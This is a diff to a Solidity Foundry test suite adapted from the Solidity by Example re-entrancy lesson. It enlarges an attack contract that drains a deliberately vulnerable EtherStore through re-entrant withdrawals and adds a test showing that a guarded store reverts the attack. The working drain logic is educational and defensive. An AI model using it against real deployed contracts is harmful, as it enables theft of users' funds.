@@ -3,7 +3,7 @@ pragma solidity ^0.8.26;
 
 import { Test } from "forge-std/Test.sol";
 
-import { EtherStore } from "../../contracts/vulnerable/ReEntrancy.sol";
+import { EtherStore, EtherStoreGuarded } from "../../contracts/vulnerable/ReEntrancy.sol";
 
 /**
  * From Solidity by Example: https://solidity-by-example.org/hacks/re-entrancy/
@@ -22,6 +22,14 @@ contract ReEntrancyAttack {
         uint256 storeBalance = address(msg.sender).balance;
         uint256 withdrawAmount = EtherStore(msg.sender).balances(address(this));
 
+        // depositar mais pra poder tirar mais rápido, sem erro de stack too deep
+        if (storeBalance > withdrawAmount) {
+            uint256 desiredDeposit = storeBalance - 2 * withdrawAmount;
+            uint256 attackerBalance = address(this).balance;
+            uint256 maxDeposit = desiredDeposit > attackerBalance ? attackerBalance : desiredDeposit;
+            EtherStore(msg.sender).deposit{ value: maxDeposit }();
+        }
+
         if (storeBalance >= withdrawAmount) {
             EtherStore(msg.sender).withdraw();
         }
@@ -32,7 +40,7 @@ contract EtherStoreReEntrant is Test {
     address deployer = makeAddr("deployer");
     address attacker = makeAddr("attacker");
 
-    uint256 constant ETHER_IN_STORE = 100 ether;
+    uint256 constant ETHER_IN_STORE = 1000 ether;
     uint256 constant INITIAL_BALANCE = 1 ether;
 
     EtherStore store = new EtherStore();
@@ -56,7 +64,7 @@ contract EtherStoreReEntrant is Test {
         assertEq(attacker.balance, INITIAL_BALANCE);
     }
 
-    function test_reentrancy() external checkSolvedByPlayer {
+    function test_reentrancy() external virtual checkSolvedByPlayer {
         ReEntrancyAttack reEntrancy = new ReEntrancyAttack();
         reEntrancy.attack{ value: INITIAL_BALANCE }(store);
     }
@@ -64,5 +72,17 @@ contract EtherStoreReEntrant is Test {
     function _isSolved() internal view {
         assertEq(address(store).balance, 0, "Store still has ETH");
         assertEq(attacker.balance, INITIAL_BALANCE + ETHER_IN_STORE, "Not enough ETH in attacker account");
+    }
+}
+
+contract EtherStoreNonReEntrant is EtherStoreReEntrant {
+    constructor() {
+        store = new EtherStoreGuarded();
+    }
+
+    function test_reentrancy() public override {
+        ReEntrancyAttack reEntrancy = new ReEntrancyAttack();
+        vm.expectRevert("Failed to send Ether");
+        reEntrancy.attack{ value: INITIAL_BALANCE }(store);
     }
 }
